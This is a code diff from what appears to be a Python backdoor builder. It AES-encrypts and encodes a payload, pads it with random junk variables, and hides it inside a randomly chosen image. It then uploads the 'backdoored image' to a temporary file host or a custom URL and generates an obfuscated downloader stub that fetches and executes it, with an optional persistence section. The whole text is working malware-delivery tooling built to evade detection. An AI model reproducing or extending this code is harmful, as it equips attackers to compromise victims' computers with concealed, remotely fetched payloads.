@@ -104,7 +104,6 @@ xoroffset = random.randint(500,10000)
 junk = junkvar + ' = "' + ''.join(random.choice(string.ascii_letters + string.digits) for x in range(xoroffset)) + xorkey + ''.join(random.choice(string.ascii_letters + string.digits) for x in range(random.randint(500,5000))) + '"'
 junk2 = randVar() + ' = "' + ''.join(random.choice(string.ascii_letters + string.digits) for x in range(random.randint(10,25000))) + '"'
 
-
 if args.persistence:
 	persistpart = '''
 	else:
@@ -145,27 +144,30 @@ cipher = AES.new(key)
 payload = EncodeAES(cipher, readyscript)
 downpayload = "exec(%s(\"%s\"))" % (bd64var,base64.b64encode("exec(%s.new(%s).decrypt(%s(\"%s\")).rstrip('{'))\n" %(AESvar,keyvar,bd64var,payload)))
 downpayload = base64.b64encode(bz2.compress(downpayload))
-with open('stubs/cup.jpg', 'rb') as di:
-	downpayload = di.read() + downpayload
+image = random.choice(os.listdir("stubs/images"))
+with open('stubs/images/' + image, 'rb') as di:
+	imagedata = di.read()
+	imagelen = len(imagedata)
+	downpayload = imagedata + downpayload
 
 if not args.customurl:
-	with open('cup.jpg', 'wb') as df:
+	with open(image, 'wb') as df:
 		df.write(downpayload)
-	print ' [<] Uploading payload code to tempsend..'
-	downurl = ftempsend('cup.jpg')
-	print ' [*] Code uploaded to %s to expire in 1 %s.' % (downurl,expirestr)
-	os.remove('cup.jpg')
+	print ' [^] Uploading backdoored image %s to tempsend..' % image
+	downurl = ftempsend(image)
+	print ' [*] Uploaded to %s to expire in 1 %s.' % (downurl,expirestr)
+	os.remove(image)
 	dlf = 'stubs/downloader.py'
 else:
-	with open('generated/backdoored_cup.jpg', 'wb') as lf:
+	with open('generated/backdoored_' + image, 'wb') as lf:
 		lf.write(downpayload)
-	print ' [V] Payload code written to generated/backdoored_cup.jpg'
+	print ' [V] Backdoored image written to generated/backdoored_' + image
 	print ' [V] Expecting it to be hosted at ' + args.customurl
 	downurl = args.customurl
 	dlf = 'stubs/downloader_cust.py'
 
 with open(dlf, 'rb') as dl:
-	downloaderscript = dl.read().replace('***URL***', downurl).replace('***B64D***', bd64var).replace('***BZ2***', bz2var).replace('***URLO***', urlvar)
+	downloaderscript = dl.read().replace('***URL***', downurl).replace('***B64D***', bd64var).replace('***BZ2***', bz2var).replace('***URLO***', urlvar).replace('***OFFSET***', str(imagelen))
 with open('tempobfs.py', 'wb') as o:
 	o.write(downloaderscript)
 obstime = subprocess.Popen('python tools/pyobfuscate.py -s %s tempobfs.py' % (''.join(random.choice(string.ascii_letters + string.digits) for x in range(random.randint(25,80)))), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
